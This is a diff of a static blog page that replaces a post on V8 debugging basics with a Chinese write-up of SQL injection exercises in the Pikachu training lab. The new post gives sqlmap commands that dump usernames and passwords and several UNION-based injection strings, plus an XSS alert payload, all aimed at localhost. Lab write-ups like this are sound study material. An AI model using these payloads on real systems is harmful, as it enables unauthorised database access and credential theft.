@@ -16,24 +16,45 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的  v8编译后二进制名称叫d8.  allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)">
+    <meta name="description" content="概述数据库注入漏洞 SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略： 1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入 2、使用参数化（Parameterized Query 或 Paramete">
 <meta property="og:type" content="article">
-<meta property="og:title" content="V8漏洞初学习">
-<meta property="og:url" content="https://sinky.top/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="pikachu-SQL注入">
+<meta property="og:url" content="https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的  v8编译后二进制名称叫d8.  allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)">
+<meta property="og:description" content="概述数据库注入漏洞 SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略： 1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入 2、使用参数化（Parameterized Query 或 Paramete">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png">
-<meta property="article:published_time" content="2022-08-09T03:17:04.132Z">
-<meta property="article:modified_time" content="2022-08-09T03:49:51.822Z">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png">
+<meta property="article:published_time" content="2022-08-14T02:39:51.516Z">
+<meta property="article:modified_time" content="2022-08-12T05:26:47.179Z">
 <meta property="article:author" content="Sinky">
-<meta property="article:tag" content="chrome_bug">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="pikachu">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png">
   
   
   
-  <title>V8漏洞初学习 - Sinky&#39;s Blog</title>
+  <title>pikachu-SQL注入 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="V8漏洞初学习"></span>
+            <span id="subtitle" data-typed-text="pikachu-SQL注入"></span>
           
         </div>
 
@@ -212,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-09 11:17" pubdate>
-          August 9, 2022 am
+        <time datetime="2022-08-14 10:39" pubdate>
+          August 14, 2022 am
         </time>
       </span>
     
@@ -224,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k words
+          4.1k words
         
       </span>
     
@@ -235,7 +256,7 @@
         
         
         
-          20 mins
+          35 mins
         
       </span>
     
@@ -273,55 +294,134 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">V8漏洞初学习</h1>
+            <h1 style="display: none">pikachu-SQL注入</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p>
-<blockquote>
-<p>v8编译后二进制名称叫d8.</p>
-</blockquote>
-<h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p>
-<figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">browser/x64.release$ ./d8 --allow-natives-syntax<br><span class="hljs-symbol">V8</span> version <span class="hljs-number">7.5</span><span class="hljs-number">.0</span> (candidate)<br>d8&gt; var a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>undefined<br>d8&gt; <span class="hljs-comment">%DebugPrint(a);</span><br><span class="hljs-number">0x2ebcfb54dd41</span> &lt;<span class="hljs-symbol">JSArray</span>[<span class="hljs-number">3</span>]&gt;<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>d8&gt; <span class="hljs-comment">%SystemBreak();</span><br><span class="hljs-symbol">Trace</span>/breakpoint trap (core dumped)<br></code></pre></td></tr></tbody></table></figure>
-
-<p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p>
-<p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p>
-<p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p>
-<p><code>source /path/to/gdbinit_v8</code></p>
-<p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p>
-<figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haml">var a = [1,2,3];<br>var b = [1.1, 2.2, 3.3];<br>var c = [a, b];<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(a)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第一次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(b)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第二次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(c)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第三次调试<br></code></pre></td></tr></tbody></table></figure>
-
-<p>gdb运行d8:</p>
-<figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/ctf/browser/x64</span>.release<span class="hljs-variable">$ </span>gdb ./d8<br>pwndbg&gt; set args --allow-natives-syntax ./test.js<br>pwndbg&gt; r<br><span class="hljs-title class_">Starting</span> <span class="hljs-symbol">program:</span> x64.release/d8 --allow-natives-syntax ./test.js<br>[<span class="hljs-title class_">Thread</span> debugging using libthread_db enabled]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87fde9700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18393</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87f5e8700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18394</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87ede7700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18395</span>)]<br><span class="hljs-number">0x12e891f8df11</span> &lt;<span class="hljs-title class_">JSArray</span>[<span class="hljs-number">3</span>]&gt;            <br></code></pre></td></tr></tbody></table></figure>
-
-<p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p>
-<p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p>
-<p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p>
-<p>telescope命令查看内存数据。</p>
-<p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p>
-<h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p>
-<p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p>
-<p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p>
-<p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p>
-<p>一个对象在内存中布局大致如下：</p>
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p>
+<p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p>
+<p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p>
+<p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p>
+<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>随便提交，抓包可知，是post方式提交的参数为</p>
+<pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2
+</code></pre>
+<p>使用sqlmap跑post方式时的格式为：</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;
+</code></pre>
+<p>1、使用sqlmap跑数据库</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch
+</code></pre>
+<p>注释：</p>
 <ul>
-<li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li>
-<li>prototype：prototype</li>
-<li>elements:对象元素</li>
-<li>length:元素个数</li>
-<li>properties:属性</li>
+<li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li>
+<li>‐‐dbs 当用户有权读取时，列出所有的数据库</li>
+<li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li>
 </ul>
-<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p>
-<p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" srcset="/img/loading.gif" lazyload alt="1.PNG"></p>
-<p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p>
-<blockquote>
-<p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p>
-</blockquote>
-<h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.codercto.com/a/81538.html">https://www.codercto.com/a/81538.html</a></p>
-<p>后续需要实践做一下这个ctf题目。</p>
-
+<p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>2、查数据库pikachu下的表</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐D pikachu 指定数据库pikachu</li>
+<li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>3、获取表users中的列</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐T users 指定表明users</li>
+<li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li>
+<li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" srcset="/img/loading.gif" lazyload alt="图片.png"></li>
+</ul>
+<p>4、获取列username和password中的字段内容</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐C username,password 指定读取列username和password中的字段内容</li>
+<li>‐‐dump 抛出前面指定内容</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p>
+<p>2、提交恒等语句可以查询到所有的数据信息</p>
+<p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>GET方法取表，抓包：</p>
+<p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p>
+<p>使用sqlmap跑：</p>
+<p>1、查数据库</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs 
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>2、查表</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>3、查列</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>4、查字段</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";
+</code></pre>
+<p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p>
+<p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p>
+<pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";
+</code></pre>
+<p>存在sql注入。<br>题</p>
+<p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>输入一个单引号’</p>
+<p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>报错，因为单引号导致语句%’没闭合。</p>
+<p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p>
+<pre><code class="hljs">'%' and 1=1 and '%'='%' order by password
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>还可以：</p>
+<ul>
+<li>%’ and 1=1‐‐’</li>
+<li>‘ and 1=1#</li>
+<li>%’ and 1=1 and ‘%’=’</li>
+</ul>
+<p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p>
+<p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p>
+<p>输入 <code>%' and 1=2 union select 1,2,3#</code></p>
+<p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p>
+<p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p>
+<p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p>
+<p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p>
+<p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p>
+<h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p>
+<p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p>
+<p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p>
+<p>哎嗨！成功弹出xss，我真是进步了。</p>
+<p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p>
+<p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p>
+<p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p>
+<p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p>
+<p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p>
+<p>3、利用联合查询：<code> a') union select 1,2#</code></p>
+<p>爆出数据库名字：<code> a') union select database(),2 #</code></p>
+<p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p>
+<p>查</p>
+<p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p>
+<p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p>
+<p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>
                 
               </div>
             
@@ -333,7 +433,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/chrome-bug/">#chrome_bug</a>
+        <a href="/tags/WEB/">#WEB</a>
+      
+        <a href="/tags/pikachu/">#pikachu</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">#SQL注入</a>
       
     </div>
   
@@ -345,8 +449,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>V8漏洞初学习</div>
-      <div>https://sinky.top/2022/08/09/V8漏洞初学习/</div>
+      <div>pikachu-SQL注入</div>
+      <div>https://sinky.top/2022/08/14/pikachu-SQL注入/</div>
     </div>
     <div class="license-meta">
       
@@ -358,7 +462,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 9, 2022</div>
+          <div>August 14, 2022</div>
         </div>
       
       
@@ -388,18 +492,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" title="WinDbg使用整理">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">WinDbg使用整理</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Ubuntu下buildroot以及qemu环境搭建">
-                        <span class="hidden-mobile">Ubuntu下buildroot以及qemu环境搭建</span>
+                      <a href="/2022/08/13/python%E5%AD%A6%E4%B9%A02/" title="Python学习2">
+                        <span class="hidden-mobile">Python学习2</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
